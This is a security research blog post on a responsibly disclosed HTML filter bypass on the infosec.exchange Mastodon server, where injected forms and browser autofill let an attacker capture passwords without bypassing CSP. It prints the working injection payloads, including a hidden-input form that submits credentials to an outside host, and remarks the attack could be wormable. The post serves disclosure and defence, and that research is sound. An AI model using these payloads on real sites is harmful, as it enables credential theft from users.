# Stealing passwords from infosec Mastodon - without bypassing CSP

Source: https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp
Fetched: 2026-06-28T09:17:29.632116+00:00

Stealing passwords from infosec Mastodon - without bypassing CSP

Gareth Heyes

Researcher

@garethheyes

Published: Tuesday, 15 November 2022 at 14:00 UTC

Updated: Wednesday, 16 November 2022 at 11:49 UTC

The story of how I could steal credentials on Infosec Mastodon with a HTML injection vulnerability, without needing to bypass CSP.

Everybody on our Twitter feed seemed to be jumping ship to the infosec.exchange Mastodon server, so I decided to see what the fuss was all about. After figuring out why exactly you had to have loads of @ symbols in your username, I began to have a look at how secure it was. If you've followed me on Twitter you'll know I like to post vectors and test the limits of the app I'm using, and today was no exception.

First, I began testing to see if HTML or Markdown was supported. I did a couple of "tweets" to see if you could have code blocks (how cool would that be?) but nothing seemed to work. That is, until @ret2bed pointed out that you could change your preferences to enable HTML! That's right people, a social network that enables you to post HTML - what could possibly go wrong?

I enabled this handy preference and redid my tests. Markdown seemed pretty limited. I was mainly hoping for code blocks but they didn't materialise. I switched to testing HTML and tested for basic stuff like bold tags, which seemed to work on the web but not on mobile. Whilst I was testing, @securitymb gave me a link to their HTML filter source code and he showed me a very interesting vector where they were decoding entities.

This gave me the feeling that this platform's HTML filter wasn't the best. I studied the source code and found that it supported a few different attributes. What looked promising was the "title" attribute, maybe I could embed tags in there and break out of it? I did a private "tweet" to see if it worked:

Input:

<abbr title="<img src=1 onerror=alert(1)>">test</abbr>

Output:

<abbr title="<img src=1 onerror=alert(1)>">test</abbr>

The content of the attribute was retained as is. This was great. It gave me a payload to use if I figured a way to break out of the attribute! Using the abbr tag I looked for single and double quotes, both of which were supported - although it seemed single quotes were converted to double quotes, I also tried quoteless attributes but they seemed to be removed. After many different private "tweets", I couldn't find a way to break out of the attribute.

I noticed a couple of people had a verified icon in their name and after asking some questions to the very helpful community, I discovered that if you use the text :verified: it would be replaced with an icon.

Input:

:verified:

Output:

<img draggable="false" class="emojione custom-emoji" alt=":verified:" … >

The icon was an img tag and it had quotes, maybe I could use that? I placed the :verified: string inside a anchor text node that was inside the title attribute:

Input:

<abbr title="<a href='https://blah'>:verified:</a><iframe src=//garethheyes.co.uk/>">

Output:

<abbr title="<a href='https://blah</a>'><img draggable=" false" ... ><iframe src=//garethheyes.co.uk/>

To my surprise, it worked! I inspected the HTML with devtools - from here I could see that the rendered iframe, and my site, loaded when viewing the "tweet" thanks to a lax frame-src directive that allows any https: URL.

The filter was completely destroyed as I could just inject arbitrary HTML, but one last thing stood in my way: they used a relatively strict Content Security Policy. Pretty much each resource was limited to infosec.exchange, with the exception of iframes which allowed any HTTPS URL.

I tried file uploads and fuzzed content types to see if modern browsers allow images to be rendered as script - they don't seem to now. I spent the next morning looking for ways to bypass the policy or look for gadgets.

I ran out of time for the CSP bypass however, @albinowax suggested I try to steal passwords using forms. Of course you could inject form elements, so I pointed a form at portswigger-labs.net and tested to see if the form submission worked. It did, so I can spoof the login form.

My next test was with Chrome autofill - would the password get filled in automatically by Chrome? Of course it would, and without any user interaction! Now I had the password, and I could create a convincing button to click, so I showed James. He had a pretty evil thought - thank goodness he's not actually evil - what if you spoofed the toolbar below the "tweet"? I spoofed the toolbar quite easily but the inputs with the username and password were visible which made it less convincing.

Almost there now … I tested Chrome to see if it would still autofill the credentials when the inputs were invisible. If you used an opacity value of zero, Chrome would still conveniently fill in the credentials. But wait - I can't use inline styles because of the CSP. I looked at the CSS files hoping to find a class that had opacity:0 and found one in a couple of seconds. I applied the class to the inputs and it worked perfectly:

<abbr title="<a href='https://blah'>:verified:</a></abbr>

<form action=//portswigger-labs.net/mastodon-demo>

<input name=username class=react-toggle-track-check>

<input type=password name=password class=react-toggle-track-check>

<div class='status__action-bar'><button type=submit aria-label='Reply' title='Reply' class='status__action-bar-button icon-button' tabindex='0'>

<i role='img' class='fa fa-reply fa-fw' aria-hidden='true'></i>

</button>

<button type=submit aria-label='Boost' aria-pressed='false' title='Boost' class='status__action-bar-button icon-button' tabindex='0' ><i role='img' class='fa fa-retweet fa-fw' aria-hidden='true'></i>

</button><button type=submit aria-label='Favourite' aria-pressed='false' title='Favourite' class='status__action-bar-button star-icon icon-button' tabindex='0'><i role='img' class='fa fa-star fa-fw' aria-hidden='true'></i>

</button><button type=submit aria-label='Bookmark' aria-pressed='false' title='Bookmark' class='status__action-bar-button bookmark-icon icon-button' tabindex='0'>

<i role='img' class='fa fa-bookmark fa-fw' aria-hidden='true'></i> </button>

<div class='status__action-bar-dropdown'><button type=submit aria-label='Menu' title='Menu' class='icon-button' tabindex='0'><i role='img' class='fa fa-ellipsis-h fa-fw' aria-hidden='true'></i> </button></div>

</div>

">

This attack could easily be wormable, by collecting credentials and re-posting the vector for each user.

If you'd like to try out a similar exploit for yourself, try our lab on stealing passwords from autofill.

Conclusion

We reported this vulnerability to Mastodon, who initially suggested the flaw may be specific to the Glitch fork used by infosec.exchange. However, they then released Mastodon 4.0.1, 3.5.5, and 3.4.10 to mitigate the issue. After discussing this with the Glitch developer, core Mastodon was not vulnerable to this particular attack since they do not allow title attributes. It was still patched to fix replacement of placeholders such as :verified:.

This was a great insight into how modern browser mitigations can prevent some attacks on real world apps. However, it also highlights how these mitigations can be sidestepped and still result in credential theft. The form-action directive could prevent these sorts of attacks, and user interaction when filling in passwords is also a good idea. Don't forget to follow @gaz@infosec.exchange and @albinowax@infosec.exchange, and make sure to switch on two factor authentication. We promise not to steal your password. We look forward to watching how the Twitter and Mastodon battle ends. For now, we will be posting on both platforms.

Timeline

Tue, 8 Nov, 18:38 - Reported HTML filter bypass to Mastodon

Tue, 8 Nov, 19:47 - Report acknowledged

Thu, 10 Nov, ​​07:37 - Glitch patched

Mon, 14 Nov, 19:48 - Mastodon patched

Tue, 15 Nov, 08:00 - Confirmed infosec.exchange had applied the patch

Tue, 15 Nov, 14:00 - Blog published

csp

HTML filter bypass

Twitter

Mastodon

Back to all articles

Related Research

Using form hijacking to bypass CSP

05 March 2024

Using form hijacking to bypass CSP

Bypassing CSP via DOM clobbering

05 June 2023

Bypassing CSP via DOM clobbering

Ambushed by AngularJS: a hidden CSP bypass in Piwik PRO

28 April 2023

Ambushed by AngularJS: a hidden CSP bypass in Piwik PRO

Bypassing CSP with dangling iframes

14 June 2022

Bypassing CSP with dangling iframes
